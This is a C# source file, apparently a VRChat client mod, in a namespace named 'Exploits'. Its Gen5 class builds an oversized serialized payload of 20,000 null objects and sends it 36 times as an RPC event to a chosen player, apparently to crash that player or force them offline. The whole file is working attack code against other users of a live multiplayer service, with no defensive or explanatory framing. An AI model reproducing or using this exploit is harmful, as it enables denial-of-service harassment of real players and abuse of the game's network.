using ExitGames.Client.Photon;
using System;
using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using VRCSDK2;

#if STEAM
using PhotonNetwork = DKGBGACHCGF;
using PhotonPlayer = MAAMBGJCOKM;
#elif OCULUS
using PhotonNetwork = DKGBGACHCGF;
using PhotonPlayer = MAAMBGJCOKM;
#endif

using Random = System.Random;

namespace Exploits
{
    public class Gen5
    {
        private class Gen5Internal : MonoBehaviour
        {
            public Gen5Internal()
            {
                DontDestroyOnLoad(this);
            }
            
            private PhotonPlayer Target;

            private IEnumerator Logout()
            {
                byte[] parameterBytes = new Protocol16().Serialize(new object[20000]);

                VRC_EventHandler.VrcEvent ev = new VRC_EventHandler.VrcEvent
                {
                    EventType = VRC_EventHandler.VrcEventType.SendRPC,
                    ParameterObject = null,
                    ParameterString = RpcSecureWrap.GetRandomRpc(),
                    ParameterBytes = parameterBytes,
                    ParameterBytesVersion = new int?(1),
                    ParameterInt = 9
                };

                for (int i = 0; i < 36; i++)
                {
                    RpcSecureWrap.SendRpcSecure(Target, ev);
                }

                yield return new WaitForEndOfFrame();
            }

            public void SetTarget(PhotonPlayer target)
            {
                Target = target;
            }

            public void Trigger()
            {
                StartCoroutine(Logout());
            }
        }

        private Gen5Internal gen5;

        public Gen5(object target)
        {
            GameObject targetObject = new GameObject();
            gen5 = targetObject.AddComponent<Gen5Internal>();
            UnityEngine.Object.DontDestroyOnLoad(targetObject);

            gen5.SetTarget((PhotonPlayer)target);
        }

        public void Trigger()
        {
            gen5.Trigger();
        }
    }
}